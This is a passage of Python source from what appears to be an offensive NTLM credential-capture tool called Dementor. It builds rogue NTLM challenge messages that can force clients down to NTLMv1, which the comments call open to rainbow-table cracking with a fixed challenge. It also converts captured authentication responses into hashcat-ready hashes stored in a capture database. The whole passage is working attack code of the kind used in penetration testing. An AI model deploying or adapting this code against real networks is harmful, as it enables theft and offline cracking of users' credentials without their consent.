            and (len(lm_response) == 0 or lm_response == b"\x00")
        )
        if is_anon:
            dm_logger.debug("Structurally anonymous AUTHENTICATE_MESSAGE detected")
        return is_anon

    except Exception:
        dm_logger.debug(
            "Failed to check anonymous status in AUTHENTICATE_MESSAGE; "
            "assuming anonymous to avoid bad captures",
            exc_info=True,
        )
        return True


# ===========================================================================
# CHALLENGE_MESSAGE Construction  [MS-NLMP section 2.2.1.2]
#
# Dementor controls this message entirely.  The two boolean parameters
# (disable_ess, disable_ntlmv2) steer which authentication protocol the
# client uses in its AUTHENTICATE_MESSAGE:
#
#   - disable_ntlmv2=True  -> omit TargetInfoFields -> client cannot build
#     the NTLMv2 Blob -> level 0-2 clients fall back to NTLMv1, level 3+
#     clients FAIL authentication
#   - disable_ess=True     -> strip ESS flag -> pure NTLMv1 (vulnerable to
#     rainbow tables with a fixed ServerChallenge)
# ===========================================================================


def NTLM_AUTH_CreateChallenge(
    token: ntlm.NTLMAuthNegotiate | dict,
    name: str,
    domain: str,
    challenge: bytes,
    disable_ess: bool = False,
    disable_ntlmv2: bool = False,
) -> ntlm.NTLMAuthChallenge:
    """Build a CHALLENGE_MESSAGE from the client's NEGOTIATE_MESSAGE flags.

    Parameters
    ----------
    token : NTLMAuthNegotiate or dict
        Parsed NEGOTIATE_MESSAGE (must have a "flags" key).
    name : str
        Server hostname for AV_PAIRS (e.g. "DEMENTOR").
    domain : str
        Server domain for AV_PAIRS (e.g. "WORKGROUP").
    challenge : bytes
        8-byte ServerChallenge nonce.
    disable_ess : bool
        Strip NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY from the
        response.  Produces pure NTLMv1 instead of NTLMv1-SSP.  Pure
        NTLMv1 with a fixed ServerChallenge is vulnerable to rainbow
        table attacks.
    disable_ntlmv2 : bool
        Clear NTLMSSP_NEGOTIATE_TARGET_INFO and omit TargetInfoFields.
        Without TargetInfoFields the client cannot construct the NTLMv2
        Blob per [MS-NLMP section 3.3.2].  Level 0-2 clients fall back to
        NTLMv1.  Level 3+ clients will FAIL authentication.

    Returns
    -------
    NTLMAuthChallenge
        Serialisable CHALLENGE_MESSAGE ready to send to the client.

    Raises
    ------
    ValueError
        If challenge is not exactly 8 bytes.

    Notes
    -----
    Flag echoing per [MS-NLMP section 3.2.5.1.1]:

        SIGN, SEAL, ALWAYS_SIGN, KEY_EXCH, 56, 128 are echoed when the
        client requests them.  This is mandatory -- failing to echo SIGN
        causes some clients to drop the connection before sending the
        AUTHENTICATE_MESSAGE, losing the capture.  Dementor never computes
        session keys; it only echoes these flags to keep the handshake alive
        through hash capture.

    ESS / LM_KEY mutual exclusivity per [MS-NLMP section 2.2.2.5 flag P]:

        If both are requested, only ESS is returned.
    """
    if len(challenge) != NTLM_CHALLENGE_LEN:
        raise ValueError(
            f"challenge must be {NTLM_CHALLENGE_LEN} bytes, got {len(challenge)}"
        )

    # Client's NegotiateFlags from NEGOTIATE_MESSAGE
    client_flags: int = token["flags"]
    dm_logger.debug(
        "Building CHALLENGE_MESSAGE: name=%r domain=%r disable_ess=%s disable_ntlmv2=%s",
        name,
        domain,
        disable_ess,
        disable_ntlmv2,
    )

    # -- Build the response flags for CHALLENGE_MESSAGE ----------------------
    response_flags: int = (
        ntlm.NTLMSSP_NEGOTIATE_VERSION  # Include VERSION structure
        | ntlm.NTLMSSP_REQUEST_TARGET  # TargetName is supplied
        | ntlm.NTLMSSP_TARGET_TYPE_SERVER  # Target is a server, not domain
    )

    # -- TargetInfoFields (controls NTLMv2 availability) -------------------
    # When set, TargetInfoFields is populated with AV_PAIRS.  Without it,
    # NTLMv2 clients cannot build the Blob and authentication fails.
    if not disable_ntlmv2:
        response_flags |= ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO

    # -- NTLM protocol flag (mandatory echo) -------------------------------
    if client_flags & ntlm.NTLMSSP_NEGOTIATE_NTLM:
        response_flags |= ntlm.NTLMSSP_NEGOTIATE_NTLM

    # -- Echo client-requested capability flags ----------------------------
    # Dementor does not implement signing/sealing but MUST echo these so
    # the client proceeds to send the AUTHENTICATE_MESSAGE.  The protocol
    # handler (SMB, HTTP, LDAP) ends the session gracefully after capture.
    for flag in (
        ntlm.NTLMSSP_NEGOTIATE_UNICODE,
        ntlm.NTLM_NEGOTIATE_OEM,
        ntlm.NTLMSSP_NEGOTIATE_56,
        ntlm.NTLMSSP_NEGOTIATE_128,
        ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH,
        ntlm.NTLMSSP_NEGOTIATE_SIGN,  # MUST echo per [MS-NLMP section 2.2.1.2]
        ntlm.NTLMSSP_NEGOTIATE_SEAL,
        ntlm.NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
    ):
        if client_flags & flag:
            response_flags |= flag

    # -- Extended Session Security (ESS) -----------------------------------
    # 0x00080000 -- upgrades NTLMv1 to use MD5-enhanced challenge derivation.
    # impacket defines this as both NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    # and NTLMSSP_NEGOTIATE_NTLM2 (same value), so one check suffices.
    if not disable_ess:
        if client_flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
            response_flags |= ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
            dm_logger.debug("ESS flag echoed into CHALLENGE_MESSAGE")

    # -- ESS / LM_KEY mutual exclusivity -----------------------------------
    if response_flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
        response_flags &= ~ntlm.NTLMSSP_NEGOTIATE_LM_KEY

    # -- Encode server identity strings ------------------------------------
    server_name: bytes = NTLM_AUTH_encode_string(name, response_flags)
    server_domain: bytes = NTLM_AUTH_encode_string(domain, response_flags)

    # -- Assemble the CHALLENGE_MESSAGE ------------------------------------
    challenge_message = ntlm.NTLMAuthChallenge()
    challenge_message["flags"] = response_flags
    challenge_message["challenge"] = challenge

    # TargetName (DomainName) -- always present
    challenge_message["domain_len"] = len(server_domain)
    challenge_message["domain_max_len"] = len(server_domain)
    challenge_message["domain_offset"] = NTLM_CHALLENGE_MSG_DOMAIN_OFFSET
    challenge_message["domain_name"] = server_domain

    # Version -- placeholder per spec
    challenge_message["Version"] = NTLM_VERSION_PLACEHOLDER
    challenge_message["VersionLen"] = NTLM_VERSION_LEN

    # TargetInfoFields -- immediately follows TargetName
    target_info_offset: int = NTLM_CHALLENGE_MSG_DOMAIN_OFFSET + len(server_domain)

    if disable_ntlmv2:
        # Empty TargetInfoFields -> client cannot build NTLMv2 Blob
        challenge_message["TargetInfoFields_len"] = 0
        challenge_message["TargetInfoFields_max_len"] = 0
        challenge_message["TargetInfoFields"] = b""
        challenge_message["TargetInfoFields_offset"] = target_info_offset
        dm_logger.debug("TargetInfoFields omitted (disable_ntlmv2=True)")
    else:
        # Populate AV_PAIRS with server identity
        av_pairs = ntlm.AV_PAIRS()
        av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = server_name
        av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = server_name
        av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = server_domain
        av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = server_domain

        challenge_message["TargetInfoFields_len"] = len(av_pairs)
        challenge_message["TargetInfoFields_max_len"] = len(av_pairs)
        challenge_message["TargetInfoFields"] = av_pairs
        challenge_message["TargetInfoFields_offset"] = target_info_offset
        dm_logger.debug("TargetInfoFields populated with AV_PAIRS")

    dm_logger.debug(
        "CHALLENGE_MESSAGE built: flags=0x%08x challenge=%s",
        response_flags,
        challenge.hex(),
    )
    return challenge_message


# ===========================================================================
# Capture Reporting -- Session Database Integration
# ===========================================================================


def NTLM_report_auth(
    auth_token: ntlm.NTLMAuthChallengeResponse,
    challenge: bytes,
    client: tuple[str, int],
    session: SessionConfig,
    logger: ProtocolLogger | None = None,
    extras: dict | None = None,
) -> None:
    """Extract all crackable hashes from an AUTHENTICATE_MESSAGE and log them.

    Top-level entry point called by protocol handlers (SMB, HTTP, LDAP)
    after receiving an AUTHENTICATE_MESSAGE.

    Extracts every valid hashcat line (NTLMv2 + LMv2, or NTLMv1/NTLMv1-SSP)
    and writes each as a separate entry to the session capture database.

    Parameters
    ----------
    auth_token : NTLMAuthChallengeResponse
        Parsed AUTHENTICATE_MESSAGE.
    challenge : bytes
        8-byte ServerChallenge from the CHALLENGE_MESSAGE Dementor sent.
    client : tuple[str, int]
        Client connection context (passed through to db.add_auth).
    session : SessionConfig
        Session context with a .db attribute for capture storage.
    logger : Logger or None
        Logger for capture output.
    extras : dict or None
        Additional metadata for db.add_auth.
    """
    # Skip anonymous sessions -- no crackable material
    if NTLM_AUTH_is_anonymous(auth_token):
        dm_logger.debug("Skipping anonymous AUTHENTICATE_MESSAGE")
        return

    try:
        negotiate_flags: int = auth_token["flags"]

        # Extract all crackable hashcat lines from this authentication
        all_hashes = NTLM_AUTH_to_hashcat_formats(
            server_challenge=challenge,
            user_name=auth_token["user_name"],
            domain_name=auth_token["domain_name"],
            lm_response=auth_token["lanman"],
            nt_response=auth_token["ntlm"],
            negotiate_flags=negotiate_flags,
        )

        if not all_hashes:
            dm_logger.warning(
                "AUTHENTICATE_MESSAGE produced no crackable hashes "
                "(user=%r flags=0x%08x)",
                auth_token["user_name"],
                negotiate_flags,
            )
            return

        # Decode identity strings once for the database columns
        user_name: str = NTLM_AUTH_decode_string(
            auth_token["user_name"],
            negotiate_flags,
        )
        domain_name: str = NTLM_AUTH_decode_string(
            auth_token["domain_name"],
            negotiate_flags,
        )

        dm_logger.debug(
            "Writing %d hash(es) to capture database for user=%r domain=%r",
            len(all_hashes),
            user_name,
            domain_name,
        )

        # Write each captured hash as a separate database entry
        for version_label, hashcat_line in all_hashes:
            session.db.add_auth(
                client=client,
                credtype=version_label,
                username=user_name,
                domain=domain_name,
                password=hashcat_line,
                logger=logger,
                extras=extras,
            )

    except ValueError:
        dm_logger.exception(
            "Invalid data in AUTHENTICATE_MESSAGE (bad challenge length or "
            "malformed response fields); skipping capture"
        )
    except Exception:
        dm_logger.exception("Failed to extract NTLM hashes from AUTHENTICATE_MESSAGE")
